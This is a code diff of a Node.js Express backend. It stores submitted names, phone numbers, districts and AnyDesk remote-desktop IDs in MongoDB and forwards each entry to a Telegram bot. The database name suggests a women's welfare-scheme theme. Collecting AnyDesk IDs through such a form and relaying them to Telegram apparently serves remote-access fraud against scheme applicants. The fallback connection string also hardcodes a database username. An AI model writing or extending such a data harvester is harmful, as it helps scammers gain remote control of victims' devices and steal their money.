@@ -1,49 +1,65 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const dotenv = require('dotenv');
 const axios = require('axios');
-
-dotenv.config();
+const cors = require('cors');
+require('dotenv').config();
 
 const app = express();
 app.use(express.json());
+app.use(cors());
 
 // MongoDB Connection
-mongoose.connect(process.env.MONGO_URI)
-  .then(() => console.log('MongoDB Connected...'))
-  .catch(err => console.log('MongoDB Connection Error: ', err));
+// Render Environment Variables-ல் MONGO_URI கொடுத்திருந்தால் அதுவே எடுத்துக்கொள்ளும்
+const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://senho1156_db_user:YOUR_PASSWORD@cluster0.mongodb.net/magaleer?retryWrites=true&w=majority"; 
 
-// MongoDB Schema
+mongoose.connect(MONGO_URI)
+  .then(() => console.log("MongoDB Connected..."))
+  .catch(err => console.error("MongoDB Connection Error:", err));
+
+// Schema
 const UserSchema = new mongoose.Schema({
   name: String,
   phone: String,
   district: String,
-  createdAt: { type: Date, default: Date.now }
+  anydesk: String,
+  date: { type: Date, default: Date.now }
 });
+
 const User = mongoose.model('User', UserSchema);
 
 // Submit Data Endpoint
 app.post('/submit-data', async (req, res) => {
   try {
-    const { name, phone, district } = req.body;
-    
-    // Save to MongoDB
-    const newUser = new User({ name, phone, district });
+    const { name, phone, district, anydesk } = req.body;
+
+    // 1. Save to MongoDB
+    const newUser = new User({ name, phone, district, anydesk });
     await newUser.save();
 
-    // Send to Telegram
-    const telegramMessage = `🔔 New Entry!\n\nName: ${name}\nPhone: ${phone}\nDistrict: ${district}`;
-    await axios.post(`https://api.telegram.org/bot${process.env.TG_TOKEN}/sendMessage`, {
-      chat_id: process.env.TG_CHAT_ID,
-      text: telegramMessage
+    // 2. Send to Telegram
+    const TG_TOKEN = process.env.TG_TOKEN; 
+    const TG_CHAT_ID = process.env.TG_CHAT_ID;
+    
+    const message = `🚨 New Entry!\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n📍 District: ${district}\n💻 AnyDesk: ${anydesk}\n📅 Date: ${new Date().toLocaleString()}`;
+    
+    await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      chat_id: TG_CHAT_ID,
+      text: message
     });
 
-    res.status(200).json({ success: true, message: 'Data submitted successfully!' });
+    res.status(200).send({ success: true, message: "Data submitted successfully!" });
   } catch (error) {
-    console.error(error);
-    res.status(500).json({ success: false, message: 'Internal Server Error' });
+    console.error("Error during submission:", error);
+    res.status(500).send({ success: false, message: "Internal Server Error" });
   }
 });
 
+// Root Route to prevent 404 (Critical for Render/UptimeRobot)
+app.get('/', (req, res) => {
+  res.send('Server is running successfully!');
+});
+
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
+app.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
+});
